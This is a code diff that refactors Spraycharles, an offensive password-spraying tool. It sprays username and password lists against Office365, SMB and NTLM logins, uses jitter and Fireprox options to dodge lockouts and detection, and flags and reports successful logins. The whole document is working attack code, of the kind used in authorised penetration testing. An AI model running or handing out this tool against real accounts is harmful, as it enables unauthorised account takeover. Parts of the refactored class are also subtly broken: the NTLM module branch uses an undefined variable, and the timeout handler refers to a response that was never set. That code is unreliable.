@@ -39,125 +39,15 @@ custom_theme = Theme(
 console = Console(theme=custom_theme)
 
 
-def args(
-    passwords,
-    users,
-    host,
-    module,
-    path,
-    csvfile,
-    attempts,
-    interval,
-    equal,
-    timeout,
-    port,
-    fireprox,
-    domain,
-    analyze_results,
-    jitter,
-    jitter_min,
-    notify,
-    webhook,
-    pause,
-):
-
-    # if any other module than Office365 is specified, make sure hostname was provided
-    if module.lower() != "office365" and not host:
-        console.print(
-            "[!] Hostname (-H) of target (mail.targetdomain.com) is required for all modules execept Office365",
-            style="danger",
-        )
-        exit()
-
-    elif module.lower() == "office365" and not host:
-        host = "Office365"  # set host to Office365 for the logfile name
-    elif module.lower() == "smb" and (timeout != 5 or fireprox or port != 443):
-        console.print(
-            "[!] Fireprox (-f), port (-b) and timeout (-t) are incompatible when spraying over SMB",
-            style="warning",
-        )
-
-    # get usernames from file
-    try:
-        with open(users, "r") as f:
-            user_list = f.read().splitlines()
-    except Exception:
-        console.print(f"[!] Error reading usernames from file: {users}", style="danger")
-        exit()
-
-    # get passwords from file, otherwise treat arg as a single password to spray
-    try:
-        with open(passwords, "r") as f:
-            password_list = f.read().splitlines()
-    except Exception:
-        password_list = [passwords]
-
-    # check that interval and attempt args are supplied together
-    if interval and not attempts:
-        console.print(
-            "[!] Number of login attempts per interval (-a) required with -i",
-            style="danger",
-        )
-        exit()
-    elif not interval and attempts:
-        console.print("[!] Minutes per interval (-i) required with -a", style="danger")
-        exit()
-    elif not interval and not attempts and len(password_list) > 1:
-        console.print(
-            "[*] You have not provided spray attempts/interval. This may lead to account lockouts!",
-            style="warning",
-        )
-        print()
-
-        Confirm.ask(
-            "[yellow]Press enter to continue anyways",
-            default=True,
-            show_choices=False,
-            show_default=False,
-        )
-
-    # Check that jitter flags aren't supplied independently
-    if jitter_min and not jitter:
-        console.print(
-            "--jitter-min flag must be set with --jitter flag", style="danger"
-        )
-        exit()
-
-    elif jitter and not jitter_min:
-        console.print(
-            "[!] --jitter flag must be set with --jitter-min flag", style="danger"
-        )
-        exit()
-
-    if jitter and jitter_min and jitter_min >= jitter:
-        console.print(
-            "[!] --jitter flag must be greater than --jitter-min flag", style="danger"
-        )
-        exit()
-
-    # Making sure user set path variable for NTLM authentication module
-    if module.lower() == "ntlm" and path is None:
-        console.print(
-            "[!] Must set --path to use the NTLM authentication module", style="danger"
-        )
-        exit()
-
-    if notify and webhook is None:
-        console.print(
-            "[!] Must specify a Webhook URL when the notify flag is used.",
-            style="danger",
-        )
-        exit()
-
-    return (
-        user_list,
-        password_list,
+class Spraycharles:
+    def __init__(
+        self,
         passwords,
         users,
         host,
         module,
         path,
-        csvfile,
+        output,
         attempts,
         interval,
         equal,
@@ -165,104 +55,402 @@ def args(
         port,
         fireprox,
         domain,
-        analyze_results,
+        analyze,
         jitter,
         jitter_min,
         notify,
         webhook,
         pause,
-    )
+    ):
+        """
+        Validate args and initalize class attributes
+        """
 
+        # if any other module than Office365 is specified, make sure hostname was provided
+        if module.lower() != "office365" and not host:
+            console.print(
+                "[!] Hostname (-H) of target (mail.targetdomain.com) is required for all modules execept Office365",
+                style="danger",
+            )
+            exit()
 
-def check_sleep(
-    login_attempts,
-    attempts,
-    interval,
-    csvfile,
-    analyze,
-    notify,
-    webhook,
-    host,
-    pause,
-    total_hits,
-):
-    if login_attempts == attempts:
-        if analyze:
-            analyzer = Analyzer(csvfile, notify, webhook, host, total_hits)
-            new_hit_total = analyzer.analyze()
+        elif module.lower() == "office365" and not host:
+            host = "Office365"  # set host to Office365 for the logfile name
+        elif module.lower() == "smb" and (timeout != 5 or fireprox or port != 443):
+            console.print(
+                "[!] Fireprox (-f), port (-b) and timeout (-t) are incompatible when spraying over SMB",
+                style="warning",
+            )
 
-            # Pausing if specified by user before continuing with spray
-            if new_hit_total > total_hits and pause:
-                print()
-                console.print(
-                    f"[+] Successful login potentially identified. Pausing...",
-                    style="good",
-                )
-                print()
-                Confirm.ask(
-                    "[blue]Press enter to continue",
-                    default=True,
-                    show_choices=False,
-                    show_default=False,
-                )
-                print()
-        else:
-            new_hit_total = (
-                0  # just set to zero since results aren't being analyzed mid-spray
+        # get usernames from file
+        try:
+            with open(users, "r") as f:
+                user_list = f.read().splitlines()
+        except Exception:
+            console.print(
+                f"[!] Error reading usernames from file: {users}", style="danger"
+            )
+            exit()
+
+        # get passwords from file, otherwise treat arg as a single password to spray
+        try:
+            with open(passwords, "r") as f:
+                password_list = f.read().splitlines()
+        except Exception:
+            password_list = [passwords]
+
+        # check that interval and attempt args are supplied together
+        if interval and not attempts:
+            console.print(
+                "[!] Number of login attempts per interval (-a) required with -i",
+                style="danger",
+            )
+            exit()
+        elif not interval and attempts:
+            console.print(
+                "[!] Minutes per interval (-i) required with -a", style="danger"
+            )
+            exit()
+        elif not interval and not attempts and len(password_list) > 1:
+            console.print(
+                "[*] You have not provided spray attempts/interval. This may lead to account lockouts!",
+                style="warning",
             )
             print()
 
-        console.print(
-            f'[yellow][*] Sleeping until {(datetime.datetime.now() + datetime.timedelta(minutes=interval)).strftime("%m-%d %H:%M:%S")}[/yellow]'
+            Confirm.ask(
+                "[yellow]Press enter to continue anyways",
+                default=True,
+                show_choices=False,
+                show_default=False,
+            )
+
+        # Check that jitter flags aren't supplied independently
+        if jitter_min and not jitter:
+            console.print(
+                "--jitter-min flag must be set with --jitter flag", style="danger"
+            )
+            exit()
+
+        elif jitter and not jitter_min:
+            console.print(
+                "[!] --jitter flag must be set with --jitter-min flag", style="danger"
+            )
+            exit()
+
+        if jitter and jitter_min and jitter_min >= jitter:
+            console.print(
+                "[!] --jitter flag must be greater than --jitter-min flag",
+                style="danger",
+            )
+            exit()
+
+        # Making sure user set path variable for NTLM authentication module
+        if module.lower() == "ntlm" and path is None:
+            console.print(
+                "[!] Must set --path to use the NTLM authentication module",
+                style="danger",
+            )
+            exit()
+
+        if notify and webhook is None:
+            console.print(
+                "[!] Must specify a Webhook URL when the notify flag is used.",
+                style="danger",
+            )
+            exit()
+
+        self.passwords = password_list
+        self.password_file = passwords
+        self.usernames = user_list
+        self.user_file = users
+        self.host = host
+        self.module = module
+        self.path = path
+        self.output = output
+        self.attempts = attempts
+        self.interval = interval
+        self.equal = equal
+        self.timeout = timeout
+        self.port = port
+        self.fireprox = fireprox
+        self.domain = domain
+        self.analyze = analyze
+        self.jitter = jitter
+        self.jitter_min = jitter_min
+        self.notify = notify
+        self.webhook = webhook
+        self.pause = pause
+        self.total_hits = 0
+        self.login_attempts = 0
+        self.target = None
+        self.log_name = None
+
+    def initialize_module(self):
+        """
+        Instantiate the specified spray module
+        """
+        try:
+            # Passing in path for NTLM over HTTP module
+            if self.module.title().lower() == "ntlm":
+                self.module = self.module.title()
+                mod_name = getattr(sys.modules[__name__], self.module)
+                class_name = getattr(mod_name, module)
+                self.target = class_name(
+                    self.host, self.port, self.timeout, self.path, self.fireprox
+                )
+            else:
+                # Else, we just pass the default arguments
+                self.module = self.module.title()
+                mod_name = getattr(sys.modules[__name__], self.module)
+                class_name = getattr(mod_name, self.module)
+                self.target = class_name(
+                    self.host, self.port, self.timeout, self.fireprox
+                )
+        except AttributeError:
+            console.print(
+                f"[!] Error loading {self.module} module. {self.module} is spelled incorrectly or does not exist",
+                style="danger",
+            )
+            exit()
+
+        # create the log file
+        if not os.path.isdir("logs"):
+            os.mkdir("logs")
+        self.log_name = "logs/%s.log" % self.host
+        logging.basicConfig(
+            filename=self.log_name,
+            level=logging.INFO,
+            format="%(asctime)s - %(levelname)s - %(message)s",
         )
-        time.sleep(interval * 60)
+
+    def pre_spray_info(self):
+        """
+        Display spray config table
+        """
+        spray_info = Table(
+            show_header=False,
+            show_footer=False,
+            min_width=61,
+            title=f"Module: {self.module.upper()}",
+            title_justify="left",
+            title_style="bold reverse",
+        )
+
+        spray_info.add_row("Target", f"{self.target.url}")
+
+        if self.domain:
+            spray_info.add_row("Domain", f"{self.domain}")
+
+        if self.attempts:
+            spray_info.add_row("Interval", f"{self.interval} minutes")
+            spray_info.add_row("Attempts", f"{self.attempts} per interval")
+
+        if self.jitter:
+            spray_info.add_row("Jitter", f"{self.jitter_min}-{self.jitter} seconds")
+
+        if self.notify:
+            spray_info.add_row("Notify", f"True ({self.notify})")
+
+        spray_info.add_row("Logfile", f"{self.log_name}")
+        spray_info.add_row("Results", f"{self.output}")
+
+        console.print(spray_info)
+
         print()
-        return 0, new_hit_total
-    else:
-        return login_attempts, total_hits
+        Confirm.ask(
+            "[blue]Press enter to begin",
+            default=True,
+            show_choices=False,
+            show_default=False,
+        )
+        print()
 
+        if self.module == "Smb":
+            console.print(
+                f"[*] Initiaing SMB connection to {self.host} ...", style="warning"
+            )
+            if self.target.get_conn():
+                console.print(
+                    f'[+] Connected to {self.host} over {"SMBv1" if self.target.smbv1 else "SMBv3"}',
+                    style="good",
+                )
 
-def check_file_contents(file_path, current_list):
-    new_list = []
-    try:
-        with open(file_path, "r") as f:
-            new_list = f.read().splitlines()
-    except:
-        # file either no longer exists, or -p flag was given a password and not a file
-        pass
+                console.print(f"\t[>] Hostname: {self.target.hostname} ", style="info")
+                console.print(f"\t[>] Domain: {self.target.domain} ", style="info")
+                console.print(f"\t[>] OS: {self.target.os} ", style="info")
+                print()
 
-    additions = list(set(new_list) - set(current_list))
-    return additions
+            else:
+                console.print(
+                    f"[!] Failed to connect to {self.host} over SMB", style="danger"
+                )
+                exit()
 
+        self.target.print_headers(self.output)
 
-def print_attempt(username, password, response, csvfile):
-    if response == "timeout":
-        code = "TIMEOUT"
-        length = "TIMEOUT"
-    else:
-        code = response.status_code
-        length = str(len(response.content))
-    print("%-27s %-17s %13s %15s" % (username, password, code, length))
-    output = open(csvfile, "a")
-    output.write("%s,%s,%s,%s\n" % (username, password, code, length))
-    output.close()
+    def _check_sleep(self):
+        """
+        If running on interval, handle analyzing and sleep interval
+        """
+        if self.login_attempts == self.attempts:
+            if self.analyze:
+                analyzer = Analyzer(
+                    self.output, self.notify, self.webhook, self.host, self.total_hits
+                )
+                new_hit_total = analyzer.analyze()
 
+                # Pausing if specified by user before continuing with spray
+                if new_hit_total > self.total_hits and self.pause:
+                    print()
+                    console.print(
+                        f"[+] Successful login potentially identified. Pausing...",
+                        style="good",
+                    )
+                    print()
+                    Confirm.ask(
+                        "[blue]Press enter to continue",
+                        default=True,
+                        show_choices=False,
+                        show_default=False,
+                    )
+                    print()
+            else:
+                new_hit_total = (
+                    0  # just set to zero since results aren't being analyzed mid-spray
+                )
+                print()
 
-def login(target, username, password, csvfile):
-    try:
-        response = target.login(username, password)
-        target.print_response(response, csvfile)
-    except requests.ConnectTimeout as e:
-        target.print_response(response, csvfile, timeout=True)
-    except (requests.ConnectionError, requests.ReadTimeout) as e:
-        console.print("\n[!] Connection error - sleeping for 5 seconds", style="danger")
-        sleep(5)
-        login(target, username, password, csvfile)
+            console.print(
+                f'[yellow][*] Sleeping until {(datetime.datetime.now() + datetime.timedelta(minutes=self.interval)).strftime("%m-%d %H:%M:%S")}[/yellow]'
+            )
+            time.sleep(self.interval * 60)
+            print()
 
+            # reset counter and set hit total
+            self.login_attempts = 0
+            self.total_hits = new_hit_total
 
-def ascii():
-    print(
-        f"""
+    def _check_file_contents(self, file_path, current_list):
+        new_list = []
+        try:
+            with open(file_path, "r") as f:
+                new_list = f.read().splitlines()
+        except:
+            # file either no longer exists, or -p flag was given a password and not a file
+            pass
+
+        additions = list(set(new_list) - set(current_list))
+        return additions
+
+    def _print_attempt(self, username, password, response):
+        if response == "timeout":
+            code = "TIMEOUT"
+            length = "TIMEOUT"
+        else:
+            code = response.status_code
+            length = str(len(response.content))
+        print("%-27s %-17s %13s %15s" % (username, password, code, length))
+        output = open(self.output, "a")
+        output.write("%s,%s,%s,%s\n" % (username, password, code, length))
+        output.close()
+
+    def _login(self, username, password):
+        try:
+            response = self.target.login(username, password)
+            self.target.print_response(response, self.output)
+        except requests.ConnectTimeout as e:
+            self.target.print_response(response, self.output, timeout=True)
+        except (requests.ConnectionError, requests.ReadTimeout) as e:
+            console.print(
+                "\n[!] Connection error - sleeping for 5 seconds", style="danger"
+            )
+            sleep(5)
+            self._login(username, password)
+
+    def spray(self):
+        """
+        Begin the password spray
+        """
+        # spray once with password = username if flag present
+        if self.equal:
+            with Progress(transient=True) as progress:
+                task = progress.add_task(
+                    f"[yellow]Equal Set", total=len(self.usernames)
+                )
+                for username in self.usernames:
+                    password = username.split("@")[0]
+                    if self.jitter is not None:
+                        if self.jitter_min is None:
+                            self.jitter_min = 0
+                        time.sleep(random.randint(self.jitter_min, self.jitter))
+                    self._login(username, password)
+                    progress.update(task, advance=1)
+
+                    # log the login attempt
+                    logging.info(f"Login attempted as {username}")
+
+            self.login_attempts += 1
+
+        # spray using password file
+        for password in self.passwords:
+            # trigger sleep if attempts limit hit
+            self._check_sleep()
+
+            # check if user/pass files have been updated and add new entries to current lists
+            # this will let users add (but not remove) users/passwords into the spray as it runs
+            new_users = self._check_file_contents(self.user_file, self.usernames)
+            new_passwords = self._check_file_contents(
+                self.password_file, self.passwords
+            )
+
+            if len(new_users) > 0:
+                console.print(
+                    f"[>] Adding {len(new_users)} new users into the spray!",
+                    style="info",
+                )
+                self.usernames.extend(new_users)
+
+            if len(new_passwords) > 0:
+                console.print(
+                    f"[>] Adding {len(new_passwords)} new passwords to the end of the spray!",
+                    style="info",
+                )
+                self.passwords.extend(new_passwords)
+
+            # print line separator
+            if len(new_passwords) > 0 or len(new_users) > 0:
+                print()
+
+            with Progress(transient=True) as progress:
+                task = progress.add_task(
+                    f"[green]Spraying: {password}", total=len(self.usernames)
+                )
+                while not progress.finished:
+                    for username in self.usernames:
+                        if self.domain:
+                            username = f"{self.domain}\\{username}"
+                        if self.jitter is not None:
+                            if self.jitter_min is None:
+                                self.jitter_min = 0
+                            time.sleep(random.randint(self.jitter_min, self.jitter))
+                        self._login(username, password)
+                        progress.update(task, advance=1)
+
+                        # log the login attempt
+                        logging.info(f"Login attempted as {username}")
+
+            self.login_attempts += 1
+
+        # analyze the results to point out possible hits
+        analyzer = Analyzer(
+            self.output, self.notify, self.webhook, self.host, self.total_hits
+        )
+        analyzer.analyze()
+
+    def ascii(self):
+        print(
+            f"""
 
 [yellow] ___  ___  ___  ___  _ _ [blue] ___  _ _  ___  ___  _    ___  ___
 [yellow]/ __>| . \| . \| . || | |[blue]|  _>| | || . || . \| |  | __>/ __>
@@ -271,7 +459,7 @@ def ascii():
 
 [yellow]                        v[blue]{VERSION}
 """
-    )
+        )
 
 
 CONTEXT_SETTINGS = dict(help_option_names=["-h", "--help", "help"])
@@ -444,30 +632,7 @@ def main(
     except Exception:
         pass
 
-    # Parsing and validating command line arguments with args() function
-    (
-        user_list,
-        password_list,
-        passfile,
-        userfile,
-        host,
-        module,
-        path,
-        output,
-        attempts,
-        interval,
-        equal,
-        timeout,
-        port,
-        fireprox,
-        domain,
-        analyze,
-        jitter,
-        jitter_min,
-        notify,
-        webhook,
-        pause,
-    ) = args(
+    spraycharles = Spraycharles(
         passwords,
         usernames,
         host,
@@ -489,180 +654,10 @@ def main(
         pause,
     )
 
-    # Counter for potential successful logins idenitified
-    total_hits = 0
-
-    # try to instantiate the specified module
-    try:
-        # Passing in path for NTLM over HTTP module
-        if module.title().lower() == "ntlm":
-            module = module.title()
-            mod_name = getattr(sys.modules[__name__], module)
-            class_name = getattr(mod_name, module)
-            target = class_name(host, port, timeout, path, fireprox)
-        else:
-            # Else, we just pass the default arguments
-            module = module.title()
-            mod_name = getattr(sys.modules[__name__], module)
-            class_name = getattr(mod_name, module)
-            target = class_name(host, port, timeout, fireprox)
-    except AttributeError:
-        console.print(
-            f"[!] Error loading {module} module. {module} is spelled incorrectly or does not exist",
-            style="danger",
-        )
-        exit()
-
-    # create the log file
-    if not os.path.isdir("logs"):
-        os.mkdir("logs")
-    log_name = "logs/%s.log" % host
-    logging.basicConfig(
-        filename=log_name,
-        level=logging.INFO,
-        format="%(asctime)s - %(levelname)s - %(message)s",
-    )
-
-    ascii()
-
-    spray_info = Table(
-        show_header=False,
-        show_footer=False,
-        min_width=61,
-        title=f"Module: {module.upper()}",
-        title_justify="left",
-        title_style="bold reverse",
-    )
-
-    spray_info.add_row("Target", f"{target.url}")
-
-    if domain:
-        spray_info.add_row("Domain", f"{domain}")
-
-    if attempts:
-        spray_info.add_row("Interval", f"{interval} minutes")
-        spray_info.add_row("Attempts", f"{attempts} per interval")
-
-    if jitter:
-        spray_info.add_row("Jitter", f"{jitter_min}-{jitter} seconds")
-
-    if notify:
-        spray_info.add_row("Notify", f"True ({notify})")
-
-    spray_info.add_row("Logfile", f"{log_name}")
-    spray_info.add_row("Results", f"{output}")
-
-    console.print(spray_info)
-
-    print()
-    Confirm.ask(
-        "[blue]Press enter to begin",
-        default=True,
-        show_choices=False,
-        show_default=False,
-    )
-    print()
-
-    if module == "Smb":
-        console.print(f"[*] Initiaing SMB connection to {host} ...", style="warning")
-        if target.get_conn():
-            console.print(
-                f'[+] Connected to {host} over {"SMBv1" if target.smbv1 else "SMBv3"}',
-                style="good",
-            )
-
-            console.print(f"\t[>] Hostname: {target.hostname} ", style="info")
-            console.print(f"\t[>] Domain: {target.domain} ", style="info")
-            console.print(f"\t[>] OS: {target.os} ", style="info")
-            print()
-
-        else:
-            console.print(f"[!] Failed to connect to {host} over SMB", style="danger")
-            exit()
-
-    target.print_headers(output)
-
-    login_attempts = 0
-
-    # spray once with password = username if flag present
-    if equal:
-        with Progress(transient=True) as progress:
-            task = progress.add_task(f"[yellow]Equal Set", total=len(user_list))
-            for username in user_list:
-                pword = username.split("@")[0]
-                if jitter is not None:
-                    if jitter_min is None:
-                        jitter_min = 0
-                    time.sleep(random.randint(jitter_min, jitter))
-                login(target, username, pword, output)
-                progress.update(task, advance=1)
-
-            # log the login attempt
-            logging.info(f"Login attempted as {username}")
-
-        login_attempts += 1
-
-    # spray using password file
-    for password in password_list:
-        # trigger sleep if attempts limit hit
-        login_attempts, total_hits = check_sleep(
-            login_attempts,
-            attempts,
-            interval,
-            output,
-            analyze,
-            notify,
-            webhook,
-            host,
-            pause,
-            total_hits,
-        )
-
-        # check if user/pass files have been updated and add new entries to current lists
-        # this will let users add (but not remove) users/passwords into the spray as it runs
-        new_users = check_file_contents(userfile, user_list)
-        new_passwords = check_file_contents(passfile, password_list)
-
-        if len(new_users) > 0:
-            console.print(
-                f"[>] Adding {len(new_users)} new users into the spray!", style="info"
-            )
-            user_list.extend(new_users)
-
-        if len(new_passwords) > 0:
-            console.print(
-                f"[>] Adding {len(new_passwords)} new passwords to the end of the spray!",
-                style="info",
-            )
-            password_list.extend(new_passwords)
-
-        # print line separator
-        if len(new_passwords) > 0 or len(new_users) > 0:
-            print()
-
-        with Progress(transient=True) as progress:
-            task = progress.add_task(
-                f"[green]Spraying: {password}", total=len(user_list)
-            )
-            while not progress.finished:
-                for username in user_list:
-                    if domain:
-                        username = f"{domain}\\{username}"
-                    if jitter is not None:
-                        if jitter_min is None:
-                            jitter_min = 0
-                        time.sleep(random.randint(jitter_min, jitter))
-                    login(target, username, password, output)
-                    progress.update(task, advance=1)
-
-            # log the login attempt
-            logging.info(f"Login attempted as {username}")
-
-        login_attempts += 1
-
-    # analyze the results to point out possible hits
-    analyzer = Analyzer(output, notify, webhook, host, total_hits)
-    analyzer.analyze()
+    spraycharles.initialize_module()
+    spraycharles.ascii()
+    spraycharles.pre_spray_info()
+    spraycharles.spray()
 
 
 # stock boilerplate
